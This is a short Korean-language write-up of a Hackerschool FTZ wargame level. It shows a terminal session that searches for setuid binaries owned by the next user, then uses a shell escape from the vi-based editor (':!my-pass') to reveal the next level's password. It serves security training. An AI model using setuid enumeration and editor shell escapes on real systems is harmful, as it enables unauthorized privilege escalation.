# Hackerschool FTZ Level 02
```
login as: level2
level2@192.168.18.131's password:
[level2@ftz level2]$ ls
hint  public_html  tmp
[level2@ftz level2]$ cat hint


텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...


[level2@ftz level2]$ find / -perm -4000 -user level3 2>/dev/null
/usr/bin/editor
[level2@ftz level2]$ /usr/bin/editor
```
```
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
:!my-pass
```
```
Level3 Password is "can you fly?".


shell returned 37

Hit ENTER or type command to continue
```

리눅스 편집기에서 명령어를 실행할 수 있다 라는 힌트가 주어진 문제이다.

먼저 `find` 명령을 통해 level3 유저의 권한으로 실행시킬 수 있는 바이너리를 찾는다.  
그랬더니 `/usr/bin/editor` 이라는 바이너리가 보인다.

실행을 하면 vi 라는 편집기 화면이 나온다.  
vi 편집기 안에서는 `:!명령어` 를 통해 명령어 사용이 가능하다.


그렇다면 ftz 에서 다음 레벨의 비밀번호를 알 수 있는 `my-pass` 명령을 입력해본다.

`:!my-pass` 라고 입력하게 되면 level3 의 비밀번호를 얻을 수 있다.